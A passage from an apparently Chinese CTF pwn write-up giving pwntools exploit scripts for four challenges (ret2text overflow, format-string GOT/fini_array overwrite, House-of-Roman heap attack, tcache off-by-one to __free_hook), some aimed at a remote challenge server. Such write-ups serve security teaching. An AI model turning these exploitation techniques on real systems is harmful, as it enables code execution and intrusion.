class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019华北-PWN1"><a class="header-anchor" href="#CISCN-2019华北-PWN1">¶</a>[CISCN 2019华北]PWN1</h2>
<h3 id="题目思路-v2"><a class="header-anchor" href="#题目思路-v2">¶</a>题目思路</h3>
<p>简单的栈溢出 + ret2text</p>
<h3 id="exp-v4"><a class="header-anchor" href="#exp-v4">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;BBB&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;BBB&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28049</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400501</span> </span><br><span class="line">pop_rdi = <span class="number">0x400793</span></span><br><span class="line">cat_flag = <span class="number">0x04007CC</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number.&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(cat_flag)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040078c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400790 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400792 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005e0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400793 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400791 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400501 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019西南-PWN1"><a class="header-anchor" href="#CISCN-2019西南-PWN1">¶</a>[CISCN 2019西南]PWN1</h2>
<h3 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h3>
<p>漏洞点是main函数中的格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, &amp;format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数只能执行一次，但是在函数退出的时候回去执行__fini_array里的函数</p>
<p>由于题目是&quot;No RELRO&quot;所以__fini_array可读可写</p>
<p>所以本题可以利用格式化字符串任意地址写来同时将__fini_array[0]写为main,printf_got写为system_plt</p>
<h3 id="exp-v5"><a class="header-anchor" href="#exp-v5">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28060</span>)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#0x80483D0 </span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment">#0x8048534 </span></span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">fini = <span class="number">0x0804979C</span></span><br><span class="line"></span><br><span class="line">payload = p32(fini+ <span class="number">2</span>) + p32(printf+<span class="number">2</span>) + p32(printf) + p32(fini)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x0804 - 0x10) + &quot;c%4$hn&quot;    #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%5$hn&quot;                                #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x83D0 - 0x0804) + &quot;c%6$hn&quot;  #83D0</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x8534 - 0x83D0) + &quot;c%7$hn&quot;  #8534</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-长城杯院校组-king-in-heap-1"><a class="header-anchor" href="#2021-长城杯院校组-king-in-heap-1">¶</a>[2021 长城杯院校组]king_in_heap_1</h2>
<h3 id="题目考点-v2"><a class="header-anchor" href="#题目考点-v2">¶</a>题目考点</h3>
<pre><code>1.uaf
2.fastbin attack
3.House-of-Roman
</code></pre>
<h3 id="漏洞分析"><a class="header-anchor" href="#漏洞分析">¶</a>漏洞分析</h3>
<p>delete 函数存在uaf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  index = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">10</span> || !heaparray[index] || !lenarray[index] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)heaparray[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时给出了printf的后3位</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="keyword">unsigned</span> __int64)&amp;<span class="built_in">printf</span> &amp; <span class="number">0xFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
<h4 id="Step1-leak-libc"><a class="header-anchor" href="#Step1-leak-libc">¶</a>Step1 leak libc</h4>
<p>首先利用给出的printf的后三位计算出stderr+157的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br></pre></td></tr></table></figure>
<p>stderr+157:这个偏移是固定，在2.23版本的libc中，之后填充0x33就可以攻击stdout结构体，从而可以制造泄露出stderr+192 的地址</p>
<p>之后就是结合fastbin attack泄露</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>]) <span class="comment">#edit unsortedbin fd</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br></pre></td></tr></table></figure>
<p>这段paylaod的写法可以参考：<a href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></p>
<h3 id="Step2-劫持malloc-hook-get-shell"><a class="header-anchor" href="#Step2-劫持malloc-hook-get-shell">¶</a>Step2 劫持malloc_hook get shell</h3>
<p>这里利用方法参考：<a href="https://blog.csdn.net/seaaseesa/article/details/103057937">https://blog.csdn.net/seaaseesa/article/details/103057937</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="EXP"><a class="header-anchor" href="#EXP">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)  </span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;context:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>])</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2020-tnote"><a class="header-anchor" href="#SWPU-2020-tnote">¶</a>SWPU 2020 tnote</h2>
<h3 id="漏洞分析-v2"><a class="header-anchor" href="#漏洞分析-v2">¶</a>漏洞分析</h3>
<p>在题目的edit函数中存在off by one</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= dword_202060[v3]; ++i )  <span class="comment">//off by one</span></span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  *(_BYTE *)(i + qword_202080[v3]) = buf;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用off by one 来修改 chunk 的szie 位来造成tacahe overlapping</p>
<h3 id="解题步骤-v2"><a class="header-anchor" href="#解题步骤-v2">¶</a>解题步骤</h3>
<p>Step1:构造overlapped chunk</p>
<p>在申请的时候需要注意，chunk2和chunk4的大小一致，方便等下释放进入tacahe</p>
<p>修改chunk1 的大小为0x71，此时chunk1和chunk2重合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure>
<p>Step2:泄露堆地址</p>
<p>释放chunk4和chunk2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; hex 0x55c37c076000 2000</span><br><span class="line">+0000 0x55c37c076000  00 00 00 00  00 00 00 00  51 02 00 00  00 00 00 00  │....│....│Q...│....│</span><br><span class="line">+0010 0x55c37c076010  00 00 00 02  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">+0020 0x55c37c076020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0060 0x55c37c076060  00 00 00 00  00 00 00 00  a0 62 07 7c  c3 55 00 00  │....│....│.b.|│.U..│</span><br><span class="line">+0070 0x55c37c076070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0250 0x55c37c076250  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│</span><br><span class="line">+0260 0x55c37c076260  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">+0270 0x55c37c076270  61 61 61 61  61 61 61 61  71 00 00 00  00 00 00 00  │aaaa│aaaa│q...│....│</span><br><span class="line">+0280 0x55c37c076280  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">+0290 0x55c37c076290  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  │....│....│Q...│....│</span><br><span class="line">+02a0 0x55c37c0762a0  30 63 07 7c  c3 55 00 00  10 60 07 7c  c3 55 00 00  │0c.|│.U..│.`.|│.U..│</span><br><span class="line">+02b0 0x55c37c0762b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+02e0 0x55c37c0762e0  00 00 00 00  00 00 00 00  41 00 00 00  00 00 00 00  │....│....│A...│....│</span><br><span class="line">+02f0 0x55c37c0762f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0320 0x55c37c076320  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  │....│....│Q...│....│</span><br><span class="line">+0330 0x55c37c076330  00 00 00 00  00 00 00 00  10 60 07 7c  c3 55 00 00  │....│....│.`.|│.U..│</span><br><span class="line">+0340 0x55c37c076340  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0370 0x55c37c076370  00 00 00 00  00 00 00 00  91 0c 02 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">+0380 0x55c37c076380  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x50 [  2]: 0x55c37c0762a0 —&gt; 0x55c37c076330 &lt;— 0x0</span><br></pre></td></tr></table></figure>
<p>泄露堆地址，利用heap_addr计算出存储0x90大小的tacahe bin count的位置以及0x50大小的tacahe bin在tacahe struct中的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x330</span></span><br><span class="line">tacahe_addr = heap + <span class="number">0x68</span></span><br><span class="line">count0x90 = heap + <span class="number">0x17</span></span><br></pre></td></tr></table></figure>
<p>Step3 泄露libc</p>
<p>泄露libc的思路就是将0x90大小的tacahe bin的conunt 改为 7 这样当我再释放下一个0x90大小的堆的时候他就会进入unsorted bin进而unsorted bin attack</p>
<p>在这之前先利用之前overlap修改 tcachebin fd 指针指向结构体，第二次申请就能申请到 tcache 结构体,从而修改数量tacahe count</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>)) <span class="comment">#任意地址写</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; bins</span></span><br><span class="line"><span class="string"># tcachebins</span></span><br><span class="line"><span class="string">0x50 [  0]: 0x558836a30017 &lt;— ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>此时的0x90大小的tacahe count 已经被改成了7，接下来只要释放一个大小为0x90的chunk它就会进入unsorted bin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step4: 利用之前的任意地址写修改__free_hook为system来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br></pre></td></tr></table></figure>
<h3 id="exp-v6"><a class="header-anchor" href="#exp-v6">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28051)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;S&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span 